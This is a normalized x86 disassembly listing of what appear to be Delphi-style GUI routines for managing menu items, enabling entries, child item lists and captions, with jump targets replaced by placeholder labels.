cmp [ edi + 0x6c ] 0x0
je r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
test [ esi + 0x1c ] 0x2
jne r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_4453e0
push eax
call EnableMenuItem
sub_446df0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x3f ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov [ esi + 0x3f ] bl
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_4471b0
mov edx eax
mov ecx ebx
mov eax edi
call sub_445380
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov eax esi
call sub_446cdc
sub_446e5c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_4138b8
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_444488
sub_446ecc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_446e4c
test esi esi
jge r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax ebx
call sub_446eb4
cmp esi eax
je r-xdata
mov esi eax
dec esi
mov edi [ ebx + 0x64 ]
mov edx ebx
mov eax edi
call sub_4471e4
mov ecx ebx
mov edx esi
mov eax edi
call sub_446fd8
sub_446f14
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_446e4c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_446e5c
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_446f6c
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x3a ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ ebp + 0x3a ] bl
mov dl 0x1
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebp + 0x64 ] 0x0
je r-xdata
mov eax [ ebp + 0x64 ]
call sub_446e4c
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_446e5c
mov [ eax + 0x3a ] 0x0
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_446e5c
cmp [ eax + 0x3a ] 0x0
je r-xdata
sub_446fd8
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp [ esi + 0x64 ] 0x0
je r-xdata
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_444488
mov ebp edi
dec ebp
test ebp ebp
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebx + 0x5c ] eax
mov cl [ esi + 0x3f ]
mov edx edi
mov eax ebx
call sub_445380
mov ecx esi
mov edx edi
mov eax [ ebx + 0x5c ]
call sub_413934
mov [ esi + 0x64 ] ebx
mov [ esi + 0x84 ] ebx
mov [ esi + 0x80 ] sub_447250
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax [ ebx + 0x5c ]
cmp ebp [ eax + 0x8 ]
jge r-xdata
mov eax ebx
call sub_446e4c
dec eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4452b0
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_4138b8
mov al [ eax + 0x3f ]
cmp al [ esi + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_4138b8
mov dl [ eax + 0x3f ]
mov eax esi
call sub_446df0
sub_44708c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_444488
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax ebx
call sub_446e4c
test eax eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4452b0
mov eax ebx
call sub_446e4c
cmp esi eax
jl r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_4138b8
mov edi eax
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_4137a8
xor eax eax
mov [ edi + 0x64 ] eax
xor eax eax
mov [ edi + 0x80 ] eax
mov [ edi + 0x84 ] eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
sub_447100
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x39 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
jne r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
jne r-xdata
mov dl [ ebx + 0x38 ]
xor dl 0x1
mov eax ebx
call sub_446d24
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_446e34
test eax eax
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
je r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax ebx
call sub_446e34
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x88 ]
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
mov edx ebx
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_4471c8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_446e4c
mov edx eax
mov ecx esi
mov eax ebx
call sub_446fd8
pop esi
pop ebx
retn
sub_4471e4
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4471b0
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_44708c
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_444488
sub_44720c
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax esi
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
pop esi
pop ebx
retn
push ebx
mov ecx eax
mov edx esi
mov eax [ esi + 0x84 ]
call [ esi + 0x80 ]
xor eax eax
jmp r-xdata
cmp [ esi + 0x82 ] 0x0
je r-xdata
sub_447250
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
push 0x0
mov ecx esi
mov edx ebx
call sub_447250
jmp r-xdata
mov eax ebx
call sub_4452b0
cmp [ ebx + 0x6c ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
call sub_448f28
sub_4472a8
push ebx
mov ebx eax
cmp [ ebx + 0x4c ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ ebx + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebx + 0x4c ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42106c
mov [ ebx + 0x4c ] eax
sub_4472d0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov eax [ ebx + 0x44 ]
call sub_403128
xor eax eax
mov [ ebx + 0x44 ] eax
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x44 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_447564
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_403324
mov edx ebx
mov eax edi
call sub_419340
mov eax ebx
mov si 0xffee
call sub_403324
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x44 ] eax
pop edi
pop esi
pop ebx
retn
sub_447340
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x4c ] 0x0
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42106c
mov [ esi + 0x4c ] eax
sub_447374
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_446e4c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_446e5c
mov edx [ eax ]
call [ edx + 0x40 ]
inc esi
dec ebx
jne r-xdata
sub_4473b4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_4471e4
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ esi + 0x34 ]
mov edx ebx
call sub_4471c8
jmp r-xdata
mov edx ebx
mov eax esi
call sub_4471c8
sub_447418
push ebx
mov ebx eax
cmp dl [ ebx + 0x3d ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x3d ] dl
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x3d ] 0x0
je r-xdata
mov eax ebx
call sub_446cdc
sub_447444
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov al [ edi + 0x95 ]
mov [ esi + 0xa8 ] al
cmp [ esi + 0xa8 ] 0x0
jne r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_446cb4
cmp [ esi + 0x30 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x69 ]
mov eax esi
call sub_446d24
cmp [ esi + 0x38 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
call sub_446d78
cmp [ esi + 0x39 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x74 ]
mov [ esi + 0x54 ] eax
cmp [ esi + 0x54 ] 0x0
jne r-xdata
test bl bl
je r-xdata
lea eax [ esi + 0x58 ]
mov edx [ edi + 0x7c ]
call sub_403ecc
cmp [ esi + 0x58 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov edx [ edi + 0x80 ]
mov eax esi
call sub_446ea4
cmp [ esi + 0x40 ] 0xffffffff
jne r-xdata
mov dl [ edi + 0x6c ]
mov eax esi
call sub_446df0
cmp [ esi + 0x3f ] 0x0
jne r-xdata
mov dx [ edi + 0x84 ]
mov eax esi
call sub_446e80
cmp [ esi + 0x60 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_446e94
cmp [ esi + 0x3e ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x88 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x8c ] eax
cmp [ esi + 0x8a ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_447564
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_446e34
cmp edi eax
jne r-xdata
pop edi
pop esi
retn
xor ecx ecx
mov edx edi
mov eax esi
mov si 0xffef
call sub_403324
sub_447588
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4475a8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4475c8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4475e8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_447608
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_447628
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_447648
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_447668
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_447688
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4476a8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_413f58
mov dl [ ebx + 0x39 ]
mov edi esi
mov eax edi
call sub_4414f8
mov edx [ ebx + 0x54 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x58 ]
mov eax edi
call sub_441630
mov edx [ ebx + 0x40 ]
mov eax edi
call sub_441690
mov edx [ ebx + 0x30 ]
mov eax edi
call sub_441390
mov dl [ ebx + 0x3e ]
mov eax edi
call sub_441750
push [ ebx + 0x8c ]
push [ ebx + 0x88 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_447720
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41958c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_446e34
cmp edi eax
jne r-xdata
cmp edi [ esi + 0x7c ]
jne r-xdata
xor edx edx
mov eax esi
call sub_4472d0
jmp r-xdata
cmp edi [ esi + 0x68 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_447774
jmp r-xdata
xor edx edx
mov eax esi
call sub_445238
sub_447774
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x7c ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x7c ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x78 ]
call sub_442c0c
mov eax ebx
call sub_4477e4
pop esi
pop ebx
retn
mov edx [ ebx + 0x78 ]
call sub_442c50
mov edx ebx
mov eax [ ebx + 0x7c ]
call sub_419340
sub_4477bc
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_4477bc
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_44490c
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_447250
mov eax ebx
pop esi
pop ebx
retn
sub_4477f8
push ebp
mov ebp esp
push ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_40bf68
test eax eax
setne bl
test bl bl
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx 0xfffffffc
mov ecx 0x1
xchg edx eax
call sub_4043d8
sub_447828
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_403f10
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_4478ac
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4479ce
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ esi ]
call sub_404138
test eax eax
jle r-xdata
test bl bl
je r-xdata
mov edi 0x1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ esi ]
call sub_404138
mov edx eax
sub edx 0x3
inc edx
mov eax [ esi ]
mov ecx 0x3
call sub_404398
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404284
jne r-xdata
inc edi
dec eax
jne r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4479d5
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403e9c
retn
mov edx esi
mov ecx [ ebp - 0x8 ]
mov eax r-xdata
call sub_404420
push [ esi ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_4041f8
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov eax [ esi ]
call sub_404138
mov ecx eax
sub ecx 0x3
mov eax [ esi ]
mov edx 0x1
call sub_404398
push [ ebp - 0x10 ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x6
call sub_4041f8
jmp r-xdata
mov edx [ esi ]
mov dl [ edx + edi - 0x1 ]
mov ecx [ rw-data ]
and edx 0xff
bt [ ecx ] edx
jae r-xdata
sub_447a0c
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x19 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_447eab
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1a ] 0x0
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_403f10
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_447e6c
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x20 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_446e4c
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
lea eax [ ebp - 0x34 ]
mov edx [ ebp - 0x4 ]
call sub_403f10
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447eb2
lea eax [ ebp - 0x48 ]
mov edx 0x4
call sub_403e9c
lea eax [ ebp - 0x34 ]
mov edx 0x3
call sub_403e9c
lea eax [ ebp - 0x18 ]
call sub_403e78
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
mov eax ebx
call sub_448060
test al al
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x38 ] eax
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_446e5c
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_404284
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg [ ebp - 0x1a ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_447828
pop ecx
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx 0x1
jmp r-xdata
mov edx esi
mov eax ebx
call sub_446e5c
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_446e5c
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403128
mov eax [ ebp - 0x20 ]
call sub_403128
mov eax [ ebp - 0x14 ]
call sub_403128
mov eax [ ebp - 0xc ]
call sub_403128
retn
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
push ebp
call sub_447828
pop ecx
mov eax [ ebp - 0x30 ]
call sub_404138
cmp ebx eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_446e5c
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x3c ]
call sub_449904
mov eax [ ebp - 0x3c ]
lea edx [ ebp - 0x2c ]
call sub_407a3c
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0x30
mov edx [ ebp - 0x30 ]
call sub_403ecc
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40bf68
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x30 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x2c ]
call sub_40bf68
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_446e5c
push eax
mov edx esi
mov eax ebx
call sub_446e5c
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
jmp r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
dec [ ebp - 0x38 ]
jne r-xdata
inc edi
xor esi esi
lea eax [ ebp - 0x44 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x30 ]
call sub_404398
mov eax [ ebp - 0x44 ]
lea edx [ ebp - 0x2c ]
call sub_407a3c
push ebp
mov eax [ ebp - 0x2c ]
call sub_4477f8
pop ecx
test al al
je r-xdata
inc ebx
jmp r-xdata
push ebp
mov eax [ ebp - 0x2c ]
call sub_4477f8
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40bf68
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x34 ]
call sub_403f10
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ecx eax
dec ecx
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x70 ]
inc esi
dec edi
jne r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_446e5c
add eax 0x30
push eax
mov edx esi
mov eax ebx
call sub_446e5c
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x40 ]
call sub_449870
mov edx [ ebp - 0x40 ]
pop eax
call sub_403ecc
mov edx esi
mov eax ebx
call sub_446e5c
push eax
mov edx esi
mov eax ebx
call sub_446e5c
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x18 ]
call sub_404138
mov edx eax
mov ecx 0x1
mov eax [ ebp - 0x18 ]
call sub_404398
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x30 ]
xor ecx ecx
call sub_4478ac
mov eax [ ebp - 0x18 ]
call sub_404138
mov edx eax
lea eax [ ebp - 0x18 ]
mov ecx 0x1
call sub_4043d8
lea edx [ ebp - 0x30 ]
mov ecx ebx
mov eax r-xdata
call sub_404420
lea eax [ ebp - 0x30 ]
mov ecx ebx
mov edx [ ebp - 0x2c ]
call sub_4478ac
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
sub_447f08
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov [ esp ] 0x0
test bl bl
jne r-xdata
xor eax eax
